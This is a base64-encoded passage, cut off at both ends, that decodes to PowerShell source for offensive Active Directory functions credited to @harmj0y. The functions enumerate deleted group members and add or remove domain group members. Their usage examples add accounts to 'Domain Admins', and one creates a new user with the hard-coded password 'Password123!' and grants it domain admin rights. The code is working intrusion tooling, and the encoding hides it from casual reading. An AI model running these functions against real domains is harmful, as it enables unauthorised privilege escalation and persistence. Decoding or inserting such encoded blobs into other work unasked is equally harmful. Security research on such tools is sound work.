AgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyAgICA9ICAgJ21zZHMtcmVwbHZhbHVlbWV0YWRhdGEnLCdkaXN0aW5ndWlzaGVkbmFtZScKICAgICAgICAgICAgJ1JhdycgICAgICAgICAgID0gICAkVHJ1ZQogICAgICAgICAgICAnTERBUEZpbHRlcicgICAgPSAgICcob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CgogICAgICAgIEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkT2JqZWN0RE4gPSAkXy5Qcm9wZXJ0aWVzWydkaXN0aW5ndWlzaGVkbmFtZSddWzBdCiAgICAgICAgICAgIEZvckVhY2goJFhNTE5vZGUgaW4gJF8uUHJvcGVydGllc1snbXNkcy1yZXBsdmFsdWVtZXRhZGF0YSddKSB7CiAgICAgICAgICAgICAgICAkVGVtcE9iamVjdCA9IFt4bWxdJFhNTE5vZGUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSAnRFNfUkVQTF9WQUxVRV9NRVRBX0RBVEEnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICAgICBpZiAoJFRlbXBPYmplY3QpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoKCRUZW1wT2JqZWN0LnBzekF0dHJpYnV0ZU5hbWUgLU1hdGNoICdtZW1iZXInKSAtYW5kICgoJFRlbXBPYmplY3QuZHdWZXJzaW9uICUgMikgLWVxIDAgKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0dyb3VwRE4nICRPYmplY3RETgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ01lbWJlckROJyAkVGVtcE9iamVjdC5wc3pPYmplY3REbgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1RpbWVGaXJzdEFkZGVkJyAkVGVtcE9iamVjdC5mdGltZUNyZWF0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdUaW1lRGVsZXRlZCcgJFRlbXBPYmplY3QuZnRpbWVEZWxldGVkCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnTGFzdE9yaWdpbmF0aW5nQ2hhbmdlJyAkVGVtcE9iamVjdC5mdGltZUxhc3RPcmlnaW5hdGluZ0NoYW5nZQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1RpbWVzQWRkZWQnICgkVGVtcE9iamVjdC5kd1ZlcnNpb24gLyAyKQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0xhc3RPcmlnaW5hdGluZ0RzYUROJyAkVGVtcE9iamVjdC5wc3pMYXN0T3JpZ2luYXRpbmdEc2FETgogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWQnKQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWRdIEVycm9yIHJldHJpZXZpbmcgJ21zZHMtcmVwbHZhbHVlbWV0YWRhdGEnIGZvciAnJE9iamVjdEROJyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEFkZC1Eb21haW5Hcm91cE1lbWJlciB7CjwjCi5TWU5PUFNJUwoKQWRkcyBhIGRvbWFpbiB1c2VyIChvciBncm91cCkgdG8gYW4gZXhpc3RpbmcgZG9tYWluIGdyb3VwLCBhc3N1bWluZwphcHByb3ByaWF0ZSBwZXJtaXNzaW9ucyB0byBkbyBzby4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LVByaW5jaXBhbENvbnRleHQgIAoKLkRFU0NSSVBUSU9OCgpGaXJzdCBiaW5kcyB0byB0aGUgc3BlY2lmaWVkIGRvbWFpbiBjb250ZXh0IHVzaW5nIEdldC1QcmluY2lwYWxDb250ZXh0LgpUaGUgYm91bmQgZG9tYWluIGNvbnRleHQgaXMgdGhlbiB1c2VkIHRvIHNlYXJjaCBmb3IgdGhlIHNwZWNpZmllZCAtR3JvdXBJZGVudGl0eSwKd2hpY2ggcmV0dXJucyBhIERpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsIG9iamVjdC4gRm9yCmVhY2ggZW50cnkgaW4gLU1lbWJlcnMsIGVhY2ggbWVtYmVyIGlkZW50aXR5IGlzIHNpbWlsYXJseSBzZWFyY2hlZCBmb3IgYW5kIGFkZGVkCnRvIHRoZSBncm91cC4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgZ3JvdXAgU2FtQWNjb3VudE5hbWUgKGUuZy4gR3JvdXAxKSwgRGlzdGluZ3Vpc2hlZE5hbWUgKGUuZy4gQ049Z3JvdXAxLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTE0KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDIpCnNwZWNpZnlpbmcgdGhlIGdyb3VwIHRvIGFkZCBtZW1iZXJzIHRvLgoKLlBBUkFNRVRFUiBNZW1iZXJzCgpPbmUgb3IgbW9yZSBtZW1iZXIgaWRlbnRpdGllcywgaS5lLiBTYW1BY2NvdW50TmFtZSAoZS5nLiBHcm91cDEpLCBEaXN0aW5ndWlzaGVkTmFtZQooZS5nLiBDTj1ncm91cDEsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksIFNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTQpLApvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMikuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIHRvIHNlYXJjaCBmb3IgdXNlci9ncm91cCBwcmluY2lwYWxzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKQWRkLURvbWFpbkdyb3VwTWVtYmVyIC1JZGVudGl0eSAnRG9tYWluIEFkbWlucycgLU1lbWJlcnMgJ2hhcm1qMHknCgpBZGRzIGhhcm1qMHkgdG8gJ0RvbWFpbiBBZG1pbnMnIGluIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpBZGQtRG9tYWluR3JvdXBNZW1iZXIgLUlkZW50aXR5ICdEb21haW4gQWRtaW5zJyAtTWVtYmVycyAnaGFybWoweScgLUNyZWRlbnRpYWwgJENyZWQKCkFkZHMgaGFybWoweSB0byAnRG9tYWluIEFkbWlucycgaW4gdGhlIGN1cnJlbnQgZG9tYWluIHVzaW5nIHRoZSBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKJFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQpOZXctRG9tYWluVXNlciAtU2FtQWNjb3VudE5hbWUgYW5keSAtQWNjb3VudFBhc3N3b3JkICRVc2VyUGFzc3dvcmQgLUNyZWRlbnRpYWwgJENyZWQgfCBBZGQtRG9tYWluR3JvdXBNZW1iZXIgJ0RvbWFpbiBBZG1pbnMnIC1DcmVkZW50aWFsICRDcmVkCgpDcmVhdGVzIHRoZSAnYW5keScgdXNlciB3aXRoIHRoZSBzcGVjaWZpZWQgZGVzY3JpcHRpb24gYW5kIHBhc3N3b3JkLCB1c2luZyB0aGUgc3BlY2lmaWVkCmFsdGVybmF0ZSBjcmVkZW50aWFscywgYW5kIGFkZHMgdGhlIHVzZXIgdG8gJ2RvbWFpbiBhZG1pbnMnIHVzaW5nIEFkZC1Eb21haW5Hcm91cE1lbWJlcgphbmQgdGhlIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5MSU5LCgpodHRwOi8vcmljaGFyZHNwb3dlcnNoZWxsYmxvZy53b3JkcHJlc3MuY29tLzIwMDgvMDUvMjUvc3lzdGVtLWRpcmVjdG9yeXNlcnZpY2VzLWFjY291bnRtYW5hZ2VtZW50LwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cElkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdNZW1iZXJJZGVudGl0eScsICdNZW1iZXInLCAnRGlzdGluZ3Vpc2hlZE5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJE1lbWJlcnMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJENvbnRleHRBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnSWRlbnRpdHknID0gJElkZW50aXR5CiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQ29udGV4dEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkR3JvdXBDb250ZXh0ID0gR2V0LVByaW5jaXBhbENvbnRleHQgQENvbnRleHRBcmd1bWVudHMKCiAgICAgICAgaWYgKCRHcm91cENvbnRleHQpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRHcm91cCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuR3JvdXBQcmluY2lwYWxdOjpGaW5kQnlJZGVudGl0eSgkR3JvdXBDb250ZXh0LkNvbnRleHQsICRHcm91cENvbnRleHQuSWRlbnRpdHkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0FkZC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgZmluZGluZyB0aGUgZ3JvdXAgaWRlbnRpdHkgJyRJZGVudGl0eScgOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJEdyb3VwKSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXIgaW4gJE1lbWJlcnMpIHsKICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyIC1tYXRjaCAnLitcXC4rJykgewogICAgICAgICAgICAgICAgICAgICRDb250ZXh0QXJndW1lbnRzWydJZGVudGl0eSddID0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICRVc2VyQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgaWYgKCRVc2VyQ29udGV4dCkgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlcklkZW50aXR5ID0gJFVzZXJDb250ZXh0LklkZW50aXR5CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJFVzZXJDb250ZXh0ID0gJEdyb3VwQ29udGV4dAogICAgICAgICAgICAgICAgICAgICRVc2VySWRlbnRpdHkgPSAkTWVtYmVyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQWRkLURvbWFpbkdyb3VwTWVtYmVyXSBBZGRpbmcgbWVtYmVyICckTWVtYmVyJyB0byBncm91cCAnJElkZW50aXR5JyIKICAgICAgICAgICAgICAgICRNZW1iZXIgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRVc2VyQ29udGV4dC5Db250ZXh0LCAkVXNlcklkZW50aXR5KQogICAgICAgICAgICAgICAgJEdyb3VwLk1lbWJlcnMuQWRkKCRNZW1iZXIpCiAgICAgICAgICAgICAgICAkR3JvdXAuU2F2ZSgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBSZW1vdmUtRG9tYWluR3JvdXBNZW1iZXIgewo8IwouU1lOT1BTSVMKClJlbW92ZXMgYSBkb21haW4gdXNlciAob3IgZ3JvdXApIGZyb20gYW4gZXhpc3RpbmcgZG9tYWluIGdyb3VwLCBhc3N1bWluZwphcHByb3ByaWF0ZSBwZXJtaXNzaW9ucyB0byBkbyBzby4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LVByaW5jaXBhbENvbnRleHQgIAoKLkRFU0NSSVBUSU9OCgpGaXJzdCBiaW5kcyB0byB0aGUgc3BlY2lmaWVkIGRvbWFpbiBjb250ZXh0IHVzaW5nIEdldC1QcmluY2lwYWxDb250ZXh0LgpUaGUgYm91bmQgZG9tYWluIGNvbnRleHQgaXMgdGhlbiB1c2VkIHRvIHNlYXJjaCBmb3IgdGhlIHNwZWNpZmllZCAtR3JvdXBJZGVudGl0eSwKd2hpY2ggcmV0dXJucyBhIERpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50Lkdyb3VwUHJpbmNpcGFsIG9iamVjdC4gRm9yCmVhY2ggZW50cnkgaW4gLU1lbWJlcnMsIGVhY2ggbWVtYmVyIGlkZW50aXR5IGlzIHNpbWlsYXJseSBzZWFyY2hlZCBmb3IgYW5kIHJlbW92ZWQKZnJvbSB0aGUgZ3JvdXAuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIGdyb3VwIFNhbUFjY291bnROYW1lIChlLmcuIEdyb3VwMSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWdyb3VwMSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAyKQpzcGVjaWZ5aW5nIHRoZSBncm91cCB0byByZW1vdmUgbWVtYmVycyBmcm9tLgoKLlBBUkFNRVRFUiBNZW1iZXJzCgpPbmUgb3IgbW9yZSBtZW1iZXIgaWRlbnRpdGllcywgaS5lLiBTYW1BY2NvdW50TmFtZSAoZS5nLiBHcm91cDEpLCBEaXN0aW5ndWlzaGVkTmFtZQooZS5nLiBDTj1ncm91cDEsQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksIFNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMTQpLApvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMikuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIHRvIHNlYXJjaCBmb3IgdXNlci9ncm91cCBwcmluY2lwYWxzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKUmVtb3ZlLURvbWFpbkdyb3VwTWVtYmVyIC1JZGVudGl0eSAnRG9tYWluIEFkbWlucycgLU1lbWJlcnMgJ2hhcm1qMHknCgpSZW1vdmVzIGhhcm1qMHkgZnJvbSAnRG9tYWluIEFkbWlucycgaW4gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpClJlbW92ZS1Eb21haW5Hcm91cE1lbWJlciAtSWRlbnRpdHkgJ0RvbWFpbiBBZG1pbnMnIC1NZW1iZXJzICdoYXJtajB5JyAtQ3JlZGVudGlhbCAkQ3JlZAoKUmVtb3ZlcyBoYXJtajB5IGZyb20gJ0RvbWFpbiBBZG1pbnMnIGluIHRoZSBjdXJyZW50IGRvbWFpbiB1c2luZyB0aGUgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLkxJTksKCmh0dHA6Ly9yaWNoYXJkc3Bvd2Vyc2hlbGxibG9nLndvcmRwcmVzcy5jb20vMjAwOC8wNS8yNS9zeXN0ZW0tZGlyZWN0b3J5c2VydmljZXMtYWNjb3VudG1hbmFnZW1lbnQvCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnR3JvdXBOYW1lJywgJ0dyb3VwSWRlbnRpdHknKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ01lbWJlcklkZW50aXR5JywgJ01lbWJlcicsICdEaXN0aW5ndWlzaGVkTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkTWVtYmVycywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkQ29udGV4dEFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdJZGVudGl0eScgPSAkSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbnRleHRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICRHcm91cENvbnRleHQgPSBHZXQtUHJpbmNpcGFsQ29udGV4dCBAQ29udGV4dEFyZ3VtZW50cwoKICAgICAgICBpZiAoJEdyb3VwQ29udGV4dCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEdyb3VwID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Hcm91cFByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRHcm91cENvbnRleHQuQ29udGV4dCwgJEdyb3VwQ29udGV4dC5JZGVudGl0eSkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbUmVtb3ZlLURvbWFpbkdyb3VwTWVtYmVyXSBFcnJvciBmaW5kaW5nIHRoZSBncm91cCBpZGVudGl0eSAnJElkZW50aXR5JyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkR3JvdXApIHsKICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlciBpbiAkTWVtYmVycykgewogICAgICAgICAgICAgICAgaWYgKCRNZW1iZXIgLW1hdGNoICcuK1xcLisnKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnRleHRBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgJFVzZXJDb250ZXh0ID0gR2V0LVByaW5jaXBhbENvbnRleHQgQENvbnRleHRBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICBpZiAoJFVzZXJDb250ZXh0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VySWRlbnRpdHkgPSAkVXNlckNvbnRleHQuSWRlbnRpdHkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXNlckNvbnRleHQgPSAkR3JvdXBDb250ZXh0CiAgICAgICAgICAgICAgICAgICAgJFVzZXJJZGVudGl0eSA9ICRNZW1iZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZW1vdmUtRG9tYWluR3J